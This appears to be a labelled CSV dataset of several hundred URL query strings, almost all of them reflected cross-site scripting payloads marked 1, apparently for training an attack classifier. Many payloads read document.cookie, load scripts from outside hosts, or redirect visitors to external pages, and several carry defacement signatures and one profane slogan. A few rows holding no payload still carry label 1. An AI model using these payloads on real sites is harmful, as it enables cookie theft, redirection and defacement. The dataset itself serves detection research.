Payload,Label
"recherche=';alert(String.fromCharCode(83,69,67,85,82,73,84<br/>,89,32,83,85,88))//\';alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(Str<br/>ing.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(String.fromCharCode(83,69,67,85,8<br/>2,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,67<br/>,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E",1
URLPage=http://vuln.xssed.net/thirdparty/scripts/pyth<br/>on5.html,1
"LINK=%22;alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83<br/>,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,67,85,82,73,84,89,<br/>32,83,85,88))%3C/SCRIPT%3E",1
"recherche=%22;alert(String.fromCharCode<br/>(83,69,67,85,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCha<br/>rCode(83,69,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E&type=artic",1
"Link=""><script>alert(""MaXWeL"")</script>",1
type=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdparty/sc<br/>ripts/python5.js%3E%3C/SCRIPT%3E,1
id=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdparty<br/>/scripts/python5.js%3E%3C/SCRIPT%3E,1
"sText=""><script>alert(""MaXWeL"")</script>",1
URLpage=http://vuln.xssed.net/thirdparty/scripts/p<br/>ython5.html,1
"np=""><script>alert(""MaXWeL"")</script>",1
"dateiname=""><script>alert(""MaXWeL"")</script>",1
ReadForm&Num=%3CBODY%20ONLOAD%3Dalert%28%27XSSED%27<br/>%29%3E,1
"SID=""><script>alert(""MaXWeL"")</script>",1
&acao=busca&dsBusca=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xs<br/>sed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"question_id=""><script>alert(""MaXWeL"")</script>",1
id_menu=busca&slc_especie=&numero_lei=&slc_licitacao=&s<br/>lc_lazer=&dt_inicial=&dt_final=&slc_concursos=&slc_conta_publica=&palavra_chave=%22%3E%27%3E%3CSCRIP<br/>T+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E,1
"cg=uploads2/load106322.png""><script>alert(document.cookie)</scr<br/>ipt><h1>By St@rExT</h1>",1
"hamq.jp/i.cfm?i=""><script>alert(""MaXWeL"")</script>",1
af=&dl=&dc=&kd=&n=&si=&fe=&cat=02&de=&ts=&wpp=&fn=0&pt=&st<br/>=&ps=&q=%3Cscript%3Ealert%28%27zupper%27%29%3C%2Fscript%3E,1
"word=""><script>alert(""MaXWeL"")</script>",1
busca=noticias&palavra=%22%3E'%3E%3CSCRIPT%20SRC=http:<br/>//vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E&pesquisa=exata&Submit=Ok,1
media=%22%3E%3Cscript%3Ealert(%22MaXWeL%22)%3C/script%3E,1
acao=busca&busca=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.<br/>net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E&Submit=OK,1
s1=Search+Articles&Search=%22%3E%3Cscript%3Ealert(document<br/>.cookie)%3C/script%3E,1
af=&dl=&dc=&kd=&n=&si=&fe=&cat=&de=&ts=&wpp=&fn=0&pt=&st=&ps=&q=%<br/>3Cscript%3Ealert%28%27zupper%27%29%3C%2Fscript%3E,1
af=&dl=&dc=&kd=&n=&si=&fe=&cat=&de=&ts=&wpp=&fn=0&pt=&st=&ps=&<br/>q=%3Cscript%3Ealert%28%27zupper%27%29%3C%2Fscript%3E,1
"emulator=""><script>alert(""MaXWeL"")</script>",1
"C=""><script>alert(""MaXWeL"")</script>",1
"skl=""><script>alert(""MaXWeL"")</script>",1
affiliate=index0001&Terms=<script>alert('zupper')</script>,1
"cd=""><script>alert(""MaXWeL"")</script>",1
player=%22%3E%3Cscript%3Ealert(%22zuppergazi%22)%3C/script%3E,1
"qu=""><script>alert(""MaXWeL"")</script>",1
"fid=""><script>alert(""MaXWeL"")</script>",1
"go=""><script>alert(""MaXWeL"")</script>",1
"logo=""><script>alert(""MaXWeL"")</script>",1
"rub=""><script>alert(""MaXWeL"")</script>",1
"reviewid=""><script>alert(""MaXWeL"")</<br/>script>",1
"session_id=""><script>alert(""MaXWeL"")</script>",1
"sala=""><script>alert(""MaXWeL"")</script>",1
"sel=""><script>alert(""MaXWeL"")</script>",1
"mfr=""><script>alert(""MaXWeL"")</script>",1
"ch=""><script>alert(""MaXWeL"")</script>",1
"date=""><script>alert(""MaXWeL"")</script>",1
"tree=""><script>alert(""MaXWeL"")</script>",1
"print=""><script>alert(""MaXWeL"")</script<br/>>",1
"vgnextoid=""><script>a<br/>lert(""MaXWeL"")</script>",1
"gn=""><script>alert(""MaXWeL"")</script>",1
query=%3Cscript%3Ealert(%22x%22);%3C/script%3E,1
Body=%22%3E%3Cscript%3Ealert(%22x%22);%3C/script%3E,1
"sport=""><script>alert(""MaXWeL"")</script>",1
StrMotore=%22%3E%3Cscript%3Ealert%28%22x%22%29%3B%3C%2Fs<br/>cript%3E&x=0&y=0&Cat=Motore,1
"qname=""><script>alert(""x"");</script>",1
"R=""><script>alert(""MaXWeL"")</script>",1
query=%22%3E%3Cscript%3Ealert(%22x%22);%3C/script%3E,1
"Action=New+Query&SearchString=""><script>alert(""<br/>x"");</script>",1
query=%3Cscript%3Ealert%28%22x%22%29%3B%3C%2Fscript%3E&eg<br/>rp=0&CodIdioma=&action=submitted&Aceptar=B%FAsqueda&cervantes=1610612736,1
"content=""><script>alert(""MaXWeL"")</script>",1
"query=""><script>alert(""x"");</script>",1
"voce=""><script>alert(""MaXWeL"")</script>",1
"errorMessage=<script>alert(""Fuck All Greece"")</script>",1
"errorMessage=<script>alert(""Fuck%20All%20Greece"")</script>",1
"pagecode=""><script>alert(""MaXWeL"")</script>",1
_br=tr&search=&words=%3Cbody+topmargin%3D0+leftmargin%3D0+o<br/>nload%3D%22document.body.innerHTML%3D%22%3Ciframe+width%3D100%25+height%3D100%25+src%3Dhttp%3A%2F%2F<br/>sinek.pandela.net%2Fhacked%2Flamed.htm%3E%3C%2Fiframe%3E%22%3B%22%3E&cid=&type=2&exclude=&sizemin=&s<br/>izemax=&from_m=3&from_d=12&from_y=2002&to_m=3&to_d=12&to_y=2007&orderby=relevance&asc=0,1
"PrintablePage=""><script>alert<br/>(""MaXWeL"")</script>",1
"PrintablePage=""><script>ale<br/>rt(""MaXWeL"")</script>",1
"pageid=""><script>alert(""MaXWeL"")</script>",1
&aranacak=''></script><script>alert(document.cookie)</script>,1
q=''></script><script>alert(document.cookie)</script>,1
"shortname=""><script>alert(""MaXWeL"")</script>",1
"q1=""><script>alert(""MaXWeL"")</script>",1
Evento.anoEvento=2007<BODY ONLOAD=alert('XSS')>,1
tur=5&harf=''></script><script>alert(document.cookie)</scr<br/>ipt>,1
"WP_ID=""><script>alert(""MaXWeL"")</script>",1
"VIDCat=18&o=""><script>alert(document.cookie)</script><h1>By<br/>St@rExT</h1>",1
doc=ozgecmis?ref=''></script><script>alert(document.cookie)</script>,1
tvc=2,1
"u=arama&a=""><script>alert(document.cookie)</script>",1
cat=''></script><script>alert(document.cookie)</script>,1
p=''></script><script>alert(document.cookie)</script>,1
l=P&sid=''></script><script>alert(document.cookie)</scri<br/>pt>,1
"domainName=""><script>alert(document.cookie)</script>",1
query=%22%3E%3Cscript%3Ealert(docume<br/>nt.cookie)%3C/script%3E&periode=30&x=10&y=9&dans=dansarticle&num_page=1&booleen=et&ordre=pertinence&<br/>cat=multimedia,1
"loginPage=""><script>alert(<br/>'starext')</script><script>alert(document.cookie)</script><h1>By St@rExT</h1>",1
queryString=''></script><script>alert('XSS')</script>,1
"pt=2&vid=1173871212_1X02X831175274&rpt=3&kt=8""><script>alert(document.c<br/>ookie)</script><h1>By St@rExT TrTekforum.com</h1>",1
mid=499af74e304f1dd705cdcfc0834c39d4&l=fr%22%3E%3Cscript<br/>%3Ealert(document.cookie)%3C/script%3E&sortBy=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
"FundingType=""><script>alert(""MaXWeL"")</script>",1
Keyword=<script>alert(document.cookie)</script>,1
q=%3Cscript%3Ealert(1);%3C/script%3E&x=r&v=lroo&o=&db3=LROO,1
"id=55""><script>alert(document.cookie)</script>",1
month=06&year=</title><script>alert('Army%2<br/>0Army!%20what%20will%20happen%20if%20they%20phish%20your%20staff%20coz%20of%20a%20stupid%20xss??!%20<br/>|%20Hexspirit')</script>,1
"id=1355""><script>alert(document.cookie)</script>",1
site=1&domains=www.aecinfo.com&manual_submit=true&s<br/>itesearch=www.aecinfo.com&client=pub-5231737647953648&forid=1&channel=4115479440&ie=ISO-8859-1&oe=IS<br/>O-8859-1&safe=active&flav=0000&sig=xZHbbQkXyrJptAi8&cof=GALT%3A%23000000%3BGL%3A1%3BDIV%3A%23082862%<br/>3BVLC%3A000000%3BAH%3Acenter%3BBGC%3AFFFFFF%3BLBGC%3AFFFFFF%3BALC%3A000000%3BLC%3A000000%3BT%3A00000<br/>0%3BGFNT%3A000000%3BGIMP%3A000000%3BFORID%3A11&hl=en&type=all&q=<script>alert(document.cookie)</scri<br/>pt>,1
year=</title><script>alert(document.cookie)</script>,1
returnURL=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%<br/>3Ch1%3EBy%20St@rExT%3C/h1%3E,1
"page_url=""><script>alert(document.cookie)</script><h1>B<br/>y St@rExT TrTekForum.com</h1><meta http-equiv=""refresh"" content=""2;<br/>url=http://lht.by.ru/uyar1.html"">",1
harf=''></script><script>alert(document.cookie)</script>,1
search=%3Cscript+src%3D%22http%3A%2F%2Fpaksites<br/>.110mb.com%2Fxss.js%3F&x=0&y=0,1
"oid=""><script>alert(document.cookie)</script><h1>By S@rExT</h1>",1
page=stats&id=2,1
"id=54""><script>alert(document.cookie)</scr<br/>ipt>",1
"fldBrowse=ALL&fldSearchBy=REQ_NO&fldText=""><script>alert(doc<br/>ument.cookie)</script><h1>By St@rExT Trtekforum.com</h1>",1
"formulaireA=envoi&id_mot=67""><script>ale<br/>rt(document.cookie)</script>&id_rubrique=5""><script>alert(document.cookie)</script>&debut_annee=2007<br/>""><script>alert(document.cookie)</script>&recherche=""><script>alert(document.cookie)</script>&recher<br/>cheAvance=Rechercher",1
"milieu=""><script>alert(""MaXWeL"")</script>",1
url=http://www.google.com'<br/>onload='alert(document.cookie)',1
categoria=%3Cscript%3Ealert(%22x%22);%3C/script%3E,1
url=%22%3E%3Cscript%3Ealert(%22x%22);%3C/sc<br/>ript%3E,1
"onumber=""><script>alert(""MaXWeL"")</script>",1
"museum=""><script>alert(""MaXWeL"")</script>",1
"jrnid=""><script>alert(""MaXWeL"")</script>",1
words=</title><body><script<br/>src=http://ha.ckers.org/s.js></script><noscript>&config=portail&Submit_ht=Rechercher,1
"email=""><script<br/>src=http://ha.ckers.org/s.js></script>",1
q=%22%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fpaksites.110mb.com%2Fguru.js%3<br/>F&w=cracks,1
service=EU&event=''<br/>><script>alert('XSS')</script>'><h1>SEDATT</h1>,1
"email=""><script>alert(document.cookie)</script><h1>By<br/>St@rExT</h1>",1
"ERR=""><script<br/>src=http://ha.ckers.org/s.js></script>",1
"Q=""><script>alert(""MaXWeL"")</script>",1
myScrip=%22%3E%3Cbody%20onload=alert(%22XSS%22)%3E&<br/>flag=sr,1
islem=''></script><script>alert(document.cookie)</script>''><h1>HACK<br/>EDBYNARCOTICXS</h1>,1
popup=''><script>alert('djsedat')</script>,1
yayin=gunce?ref=''></script><script>alert(document.cookie)</s<br/>cript>,1
rehber=''><script>alert('XSS')</script>,1
"_Mot1=""><script<br/>src=http://ha.ckers.org/s.js></script>&_Rub%5B%5D=0",1
"artid=""><script>alert(""MaXWeL"")</script>",1
ionasFrameCheckName=haupt&io<br/>nasFrameCheckUrl=http://cyber-sabotage.org/images/navbar.jpg,1
skipflashdetection=true&skipflashdetection=X%0d%0a</script><<br/>script>alert('XSS')</script>,1
"pge=""><script>alert(""MaXWeL"")</script>",1
zi=1/XJ&sdn=militaryhistory&zu=%22%3E%<br/>3Cscript%3Ealert(%22xss%22)%3C/script%3E&REF=,1
"location=""><script>alert(""MaXWeL"")</script>",1
orta=bleke?ref=''></script><script>alert(document.cookie)<<br/>/script>'><h1>HACKEDNarcoticxs</h1>,1
"TRACKID=""><script>alert(""MaXWeL"")</script>",1
"invreq=/default.aspx?pid=""><script>alert(""MaXWeL"")</scr<br/>ipt>",1
strPageSuivante=&strTitrePage=Abonnement+%3<br/>A+Erreur+%21&strTitreArrondi=Abonnement+%3A+Erreur+%21&strMessage=%22%3E%3Cscript%20src=http://ha.ck<br/>ers.org/s.js%3E%3C/script%3E,1
"Sites%5B%5D=107&NbParPage=10&Sour<br/>ce=interne&TypeRecherche=totale&TypeDocument=&Debut=&Fin=&offset=0&MotsCles=""><script<br/>src=http://ha.ckers.org/s.js></script>&submit=Ok",1
"doc_id=""><script>alert(""MaXWeL"")</script>",1
vendor=wss&qu=%27%3Balert%28String.fromCharCode%2883%<br/>2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F%5C%27%3Balert%28String.fromCharCo<br/>de%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F%22%3Balert%28String.fromC<br/>harCode%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F%5C%22%3Balert%28Stri<br/>ng.fromCharCode%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F--%3E%3C%2FSC<br/>RIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2<br/>C32%2C83%2C85%2C88%29%29%3C%2FSCRIPT%3E,1
"quick=""><script>alert(""MaXWeL"")</script>",1
search=''><script>alert('XSS')</script>''><h1>sedatsedatsedatsedat<br/>sedatsedatsedatnarcoticxsnarcoticxsnarcoticxs</h1>,1
"articleID=""><script>alert(""MaXWeL"")</script>",1
ax=soru_izle&soru_id=205&kid=1&mod=''><script>alert('XSS')</sc<br/>ript>,1
sort=score&method=or&config=htdig%2Fwww_mi2g_com&words=</title><br/><body><script src=http://ha.ckers.org/s.js></script><noscript>,1
url=%22%3E%3Cscript%3Ealert(%22x%22);%3C/script%3E,1
StoryID=20060502-025032-6098r&TopicsID=t%22><script%2<br/>0src=http://ha.ckers.org/s.js></script>,1
"id=""><script>alert('KiLiCaRsLaN')</script>",1
"sez=""><script>alert(""MaXWeL"")</script>",1
"IDpage=""><script>alert(""MaXWeL"")</script>",1
k=</title><script>alert(document.cookie)</script>,1
"item=""><script>alert(""MaXWeL"")</script>",1
serial=%3Ch1%3EGURUS%3C%2Fh1%3E%3Cmarquee%3EDont+Mess+With+U<br/>s%3C%2Fmarquee%3E,1
"PERSONAL_DATA_firstName=csdt%22%3E%3Cbody%20onload=""alert(docu<br/>ment.cookie)""",1
"pag_id=""><script>alert(""MaXWeL"")</script>",1
lastname=<script>alert(document.cookie)</script>,1
"IDCategoria=""><script>alert(""MaXWeL"")</script>",1
"iAreaId=""><script>alert(""MaXWeL"")</script>",1
"knu1=""><script>alert(""MaXWeL"")</script>",1
hangisi=%3Cscript%3Ealert(%22hacked%20By%20St@rExT%22)%3C/scrip<br/>t%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EBy%20St@rExT%3C/h1%3E,1
"title=""><script>alert(""MaXWeL"")</script>",1
"p1=""><script>alert(""MaXWeL"")</script>",1
"strFolder=""><script>alert(""MaXWeL"")</script>",1
"NewsID=""><script>alert(""MaXWeL"")</script>",1
"File=""><script>alert(""MaXWeL"")</script>",1
"comebackto=""><script>alert(""MaXWeL"")</script>",1
"ln=""><script>alert(""MaXWeL"")</script>",1
"dc=""><script>alert(""MaXWeL"")</script>",1
fw=%22%3E%3Ch1%3EHacked%20By%20St@rExT%20and%20candark%2<br/>0TrTekforum.com%3C/h1%3E%3Cscript%3Ealert(%22By%20St@rExT%20%20candark%20trtekforum.com%22)%3C/scrip<br/>t%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%222<br/>;URL=http://lht.by.ru/uyar1.html%22%3E,1
"product=""><script>alert(""MaXWeL"")</script>",1
"intProdID=""><script>alert(""MaXWeL"")</scr<br/>ipt>",1
s=rate&pg=q&plq=%22%3Ehttp://finans.mynet.com/arama/?s=rate&pg=q&plq=%2<br/>2%3E%3Ch1%3EHacked%20By%20St@rExT%20and%20candark%20TrTekforum.com%3C/h1%3E%3Cscript%3Ealert(%22By%2<br/>0St@rExT%20%20candark%20trtekforum.com%22)%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%<br/>3E%3Cmeta%20http-equiv=%22refresh%22%20content=%222;URL=http://lht.by.ru/uyar1.html%22%3E,1
"ftp=""><script>alert(""MaXWeL"")</script>",1
"newsid=""><script>alert(""MaXWeL"")</script>",1
"VT=""><script>alert(""MaXWeL"")</script>",1
"division=""><script>alert(""MaXWeL"")</script>",1
"kat=""><script>alert(""MaXWeL"")</script>",1
"productId=""><script>alert(""MaXWeL"")</script>",1
s=rate&pg=q&plq=%22%3E%3Ch1%3EHacked%20By%20St@rExT%20candark%20and%2<br/>0atles%3C/h1%3E%3Cscript%3Ealert(%22By%20St@rExT%20%20candark%20trtekforum.com%22)%3C/script%3E%3Csc<br/>ript%3Ealert(document.cookie)%3C/script%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%222;URL=http<br/>://lht.by.ru/uyar1.html%22%3E,1
persistent=&login=%22%3E%3Cscript%3Ealert%28%27Ownz<br/>+Your+System+%21%21By%21%21+Vagrant%27%29%3C%2Fscript%3E%3Cimg+src%3D%22http%3A%2F%%22%3E%3C,1
go=Downloads&p=ld&mode=file&val=1%22%3E%3Ch1%3EBy%20St@rExT%<br/>3C/h1%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
"TAG=""><script>alert(""MaXWeL"")</script>",1
"doc=""><script>alert(""MaXWeL"")</script>",1
"view=""><script>alert(""MaXWeL"")</script>",1
"regid=""><script>alert(""MaXWeL"")</script>",1
issuetype=1005&nameorts=1&LookupValue=%3Cscript%3Ealert%2<br/>8%22XSS | Hexspirit%22%29%3C%2Fscript%3E,1
go=Downloads&p=ld&mode=file&val=1%22%3E%3Ch1%3EBy%20St@rExT%3C/<br/>h1%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
go=Downloads&p=ld&mode=file&val=1%22%3E%3Ch1%3EBy%20St@rExT%3C/h1%<br/>3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
q=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdparty/scrip<br/>ts/python5.js%3E%3C/SCRIPT%3E,1
"newscat=""><script>alert(""MaXWeL"")</script>",1
"DisplayYear=""><script>alert(""MaXWeL"")</script>",1
searWords=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.x<br/>ssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&Send=Pesquisar,1
keyword=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdparty/<br/>scripts/python5.js%3E%3C/SCRIPT%3E,1
go=Downloads&p=ld&mode=file&val=1%22%3E%3Ch1%3EBy%20St@rExT%3C/h1%3E%<br/>3Cscript%3Ealert(document.cookie)%3C/script%3E,1
keyword=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvu<br/>ln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&boolean=and&keyword2=&sort=title,1
cx[][][][][][][][][][][][][][][][][][]=%22%3E%3Cscript%3Ealert(document.<br/>cookie)%3C/script%3E,1
cx[][][][][][][][][][][][][][][][][][]=%22%3E%3Cscript%3E<br/>alert(document.cookie)%3C/script%3E,1
cx[][][][][][][][][][][][][][][][][][]=%22%3E%3Cscript%3Eale<br/>rt(document.cookie)%3C/script%3E,1
cx[][][][][][][][][][][][][][][][][][]=%22%3E%3Cscript%3Ealert(d<br/>ocument.cookie)%3C/script%3E,1
paction=6&pcod_noticia=0&pnum_pagina=1&pnum_registr<br/>os=30&pfiltro_tit_noticia=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscr<br/>ipts%2Fpython5.js%3E%3C%2FSCRIPT%3E&pnum_coluna_ord=1,1
ne=show&kad=%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
cx[][][][][][][][][][][][][][][][][][<br/>]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
cx[][][][][][][][][][][][][][][][][][]=%22%3E%3Cscript%3Ealert(document<br/>.cookie)%3C/script%3E,1
"Lang_ID=""><script>alert(""MaXWeL"")</script>",1
cx[][][][][][][][][][][][][][][][][][]=%22%3E%3Cscript%3Ealert(doc<br/>ument.cookie)%3C/script%3E,1
"painting=""><script>alert(""MaXWeL"")</script>",1
"tisk=""><script>alert(""MaXWeL"")</script>",1
"pic=""><script>alert(""MaXWeL"")</script>",1
"area=""><script>alert(""MaXWeL"")</script>",1
"Content=""><script>alert(""MaXWeL"")</script>",1
"StringaDaCercare=""><script>alert(""MaXWeL"")</script>",1
"d_op=""><script>alert(""MaXWeL"")</script>",1
"Title=<script>alert(""SCRiPToRiuM(Turkey)"")</script><br/><meta http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
s=rate&pg=q&plq=%22%3E%22%3E%3Ch1%3EHacked%20By%20St@rExT%20and%20cand<br/>ark%20TrTekforum.com%3C/h1%3E%3Cscript%3Ealert(%22By%20St@rExT%20%20candark%20trtekforum.com%22)%3C/<br/>script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cmeta%20http-equiv=%22refresh%22%20content<br/>=%222;URL=http://lht.by.ru/uyar1.html%22%3E,1
"RenderForPrint=""><script>alert(""MaXWeL"")</script>",1
group=%22%3E%3Ch1%3EHacked%20By%20St@rExT%3C/h1%3E%3Cscr<br/>ipt%3Ealert(%22By%20St@rExT%20Your%20Site%20xss%20cookie%20play%20own%20by%20starext%22)%3C/script%3<br/>E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%221;%2<br/>0url=http://lht.by.ru/uyar1.html%22%3E,1
"language_id=""><script>alert(""MaXWeL"")</script>",1
"Language=""><script>alert(""MaXWeL"")</script<br/>>",1
"CFID=""><script>alert(""MaXWeL"")</script>",1
"Category=""><script>alert(""MaXWeL"")</script>",1
"model_type=""><script>alert(""MaXWeL"")</script>",1
"subcat=""><script>alert(""MaXWeL"")</script>",1
"sid=""><script>alert(""MaXWeL"")</script>",1
"trkid=""><script>alert(""MaXWeL"")</script>",1
"Key=""><script>alert(""MaXWeL"")</script>",1
"P=""><script>alert(""MaXWeL"")</script>",1
"tipo=""><script>alert(""MaXWeL"")</script>",1
"filename=""><script>alert(""MaXWeL"")</script>",1
"details=""><script>alert(""MaXWeL"")</script>",1
"expose_Id=""><script>alert(""MaXWeL"")</script>",1
"brochure=""><script>alert(""MaXWeL""<br/>)</script>",1
"archive=""><script>alert(""MaXWeL"")</script>",1
"grade=""><script>alert(""MaXWeL"")</s<br/>cript>",1
"Title=<script>alert(""SCRiPToRiuM(Turkey)"")</script><met<br/>a http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
"ProductID=""><script>alert(""MaXWeL"")</script>",1
"yollayan_sayfa=""><h1>Hacked By St@rExT and<br/>Candark</h1><script>alert(document.cookie)</script><script>location=""http://lht.by.ru/uyar1.html""</s<br/>cript>",1
"Title=<script>alert(""SCRiPToRiuM(Turkey)"")</script><m<br/>eta http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
"Title=<script>alert(""SCRiPToRiuM(Turkey)"")</script><meta<br/>http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
"download=""><script>alert(""MaXWeL"")</script>",1
"navigationID=""><script>alert(""MaXWeL"")</script>",1
"Sayfa=""><script>alert(""MaXWeL"")</script>",1
"Title=<script>alert(""SCRiPToRiuM(Turkey)"")</scr<br/>ipt><meta http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
"Arch=""><script>alert(""MaXWeL"")</script>",1
"aid=""><script>alert(""MaXWeL"")</script>",1
"redirecturl=""><script>alert(""xssed"")</script>",1
"mnuNews=""><script>alert(""MaXWeL"")</script>",1
"ord=""><script>alert(""MaXWeL"")</script>",1
gormek=%22%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fsinek.pandela.net<br/>%2Fj.js%3E%3C%2FSCRIPT%3E&devam=Ara,1
"NewsDateYY=""><script>alert(""MaXWeL"")</script>",1
"Title=<script>alert(""SCRiPToRiuM(T<br/>urkey)"")</script><meta http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
"css=""><script>alert(""MaXWeL"")</script>",1
"scope=""><script>alert(""MaXWeL"")</script>",1
"Title=<script>alert(""SCRiPToRiuM(Turkey)"")</<br/>script><meta http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
"sDestUrl=""><script>alert(""MaXWeL"")</script>",1
action=<script>alert(document.cookie)</script><h1>By%20St@rExT</h1>,1
"s=mobi&words=""><script>alert(""HackeD worldshacker"")</script>",1
lang=TR&sablon_id=3&ana_id=%22%3E%3CSCRIPT%20SRC=http://sinek<br/>.pandela.net/j.js%3E%3C/SCRIPT%3E,1
"sample=""><script>alert(""MaXWeL"")</script>",1
&Nutzername=TotalSchaden&Anrede=Herr&Vorname=TotalSchaden&Nac<br/>hname=TotalSchaden&Strasse=&PLZ=&Ort=&Telefon=&Fax=&eMail=%5C%22%3E%3Cscript%3Ealert%28%2FTotalSchad<br/>en%2F%29%3C%2Fscript%3E&realmail=1234&realmailcheck=Qs5tG&vereine=0&send=Formular+absenden,1
"sorder=""><script>alert(""MaXWeL"")</script>",1
SID=&LANG=DE&LOC=1204&LOCFROM=0001&forum=Wetter&searchstr=TotalSchaden%3Cs<br/>cript%3Ealert%28/TotalSchaden/%29%3C%2Fscript%3E&search_comment=1&x=0&y=0,1
"Title=<script>alert(""cyber_thief(Turkey)%20NationTeam.com"")<<br/>/script>",1
"course=asp&Title=<script>alert(""cyber_thief(Turkey)<br/>%20NationTeam.com"")</script>",1
"Title=<script>alert(""cyber_thief(Turk<br/>ey)%20NationTeam.com"")</script>",1
"Title=<script>alert(""cyber_thief(Turkey)%20NationTea<br/>m.com"")</script>",1
"Title=<script>alert(""cyber_thief(Turkey)%20NationTeam.com"")</s<br/>cript>",1
sid=43d4e9c3d1d1ab6630f0f3c1c90591c2&search=st<br/>r&city=M%FCnchen&plz=&str=%22%3E%3Cscript%3Ealert%28%22TOTALSCHADEN%22%29%3C%2Fscript%3E&num=,1
"Title=<script>alert(""cyber_thief(T<br/>urkey)%20NationTeam.com"")</script>",1
"Title=<script>alert(""SCRiPToRiuM(Turkey)"")<<br/>/script><meta http-equiv=""refresh"" content=""0;URL=http://www.canixim.com"">",1
